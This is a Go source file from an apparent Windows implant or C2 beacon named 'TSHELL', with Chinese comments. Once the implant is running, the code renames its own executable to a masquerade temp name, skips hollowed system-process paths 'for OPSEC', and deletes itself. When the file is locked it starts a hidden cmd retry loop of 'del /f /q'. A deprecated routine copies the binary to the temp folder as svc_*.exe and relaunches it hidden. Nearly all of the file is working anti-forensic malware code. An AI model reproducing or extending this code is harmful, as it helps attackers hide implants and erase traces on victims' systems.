//go:build windows

package app

import (
	"fmt"
	"implant/core/config"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

// ReleaseFileLock 上线后释放部署文件占用：将自身重命名为同目录随机名。
// 运行中的 exe 可重命名（锁定的是文件对象而非路径）——重命名后原路径释放，
// 部署的客户端文件可直接删除；改名后的文件仍运行但路径随机，不占用部署路径。
// 环境变量 TSHELL_NO_RELOCATE=1 可禁用（本地调试场景）。
func ReleaseFileLock() {
	if os.Getenv("TSHELL_NO_RELOCATE") == "1" {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	exe = filepath.Clean(exe)
	// DLL 加载模式（rundll32/regsvr32）不做重命名
	if strings.HasSuffix(strings.ToLower(exe), ".dll") {
		return
	}
	// 进程镂空(Process Hollowing)的 beacon 以系统/目标进程路径运行（如 notepad.exe）：
	// 绝不能改名/删除系统文件，直接跳过（OPSEC: 不破坏宿主进程文件）
	lower := strings.ToLower(exe)
	if strings.Contains(lower, "\\windows\\system32\\") || strings.Contains(lower, "\\windows\\syswow64\\") ||
		strings.Contains(lower, "\\windows\\system32.exe") {
		return
	}
	sysBase := []string{"notepad.exe", "svchost.exe", "explorer.exe", "conhost.exe", "dllhost.exe", "rundll32.exe", "regsvr32.exe", "taskhostw.exe", "sihost.exe", "winlogon.exe", "csrss.exe", "services.exe", "lsass.exe", "smss.exe", "wininit.exe"}
	b := strings.ToLower(filepath.Base(exe))
	for _, s := range sysBase {
		if b == s {
			return
		}
	}
	// 已解锁过（随机名）则跳过
	base := filepath.Base(exe)
	if strings.HasPrefix(base, "~"+config.MasqueradeName()+"_") || strings.HasPrefix(base, "svc_") {
		return
	}
	dir := filepath.Dir(exe)
	newName := fmt.Sprintf("~%s_%08x.tmp", config.MasqueradeName(), time.Now().UnixNano()&0xFFFFFFFF)
	newPath := filepath.Join(dir, newName)
	if err := os.Rename(exe, newPath); err != nil {
		return
	}

	// 上线后自动删除自身文件（编译期配置 AUTO_DELETE，默认开）：
	// 改名后立即尝试删除（映像句柄含 FILE_SHARE_DELETE 时成功——文件立即消失、进程保持在线，
	// 不依赖第三方清理，桌面/temp 部署均不留 ~svc_*.tmp 痕迹）；删除被锁则挂后台重试删除器
	// （进程退出后自动清理），保持"不占用进程文件"的兜底语义。
	if config.AutoDelete() {
		if err := os.Remove(newPath); err == nil {
			return
		}
		scheduleStartupDelete(newPath)
	}
}

// scheduleStartupDelete 启动阶段的循环删除器（同 commands.DeleteSelf 的兜底）：
// 每 2 秒重试删除，成功即退出；最多 150 次（5 分钟）。
func scheduleStartupDelete(path string) {
	delCmd := fmt.Sprintf(
		`for /L %%%%i in (1,1,150) do @(del /f /q "%s" 2>nul && exit /b 0) & ping -n 2 127.0.0.1 >nul`,
		path)
	cmd := exec.Command("cmd", "/c", delCmd)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	_ = cmd.Start()
}

// RelocateToTemp 将运行中的可执行文件复制到临时目录并以隐藏窗口重新运行，
// 释放原文件占用（前端/运维可删除部署的客户端文件），随后当前进程退出。
// 环境变量 TSHELL_NO_RELOCATE=1 可禁用（本地调试场景）。
// 【已废弃】部署方确认"复制到 temp 改名重启"行为有误，改用 ReleaseFileLock
// （原地重命名解锁，不复制不重启）。此函数保留供历史兼容。
func RelocateToTemp() {
	if os.Getenv("TSHELL_NO_RELOCATE") == "1" {
		return
	}
	exe, err := os.Executable()
	if err != nil {
		return
	}
	exe = filepath.Clean(exe)
	// 已在临时目录（已是重定位副本）则跳过
	if strings.HasPrefix(strings.ToLower(exe), strings.ToLower(filepath.Clean(os.TempDir()))) {
		return
	}
	// DLL 加载模式（rundll32/regsvr32）不做重定位
	if strings.HasSuffix(strings.ToLower(exe), ".dll") {
		return
	}
	data, err := os.ReadFile(exe)
	if err != nil {
		return
	}
	dest := filepath.Join(os.TempDir(), fmt.Sprintf("svc_%d_%d.exe", os.Getpid(), time.Now().UnixNano()%1000000))
	if err := os.WriteFile(dest, data, 0755); err != nil {
		return
	}
	cmd := exec.Command(dest, os.Args[1:]...)
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000, // CREATE_NO_WINDOW：副本以隐藏窗口运行
	}
	if err := cmd.Start(); err != nil {
		os.Remove(dest)
		return
	}
	cmd.Process.Release()
	os.Exit(0)
}
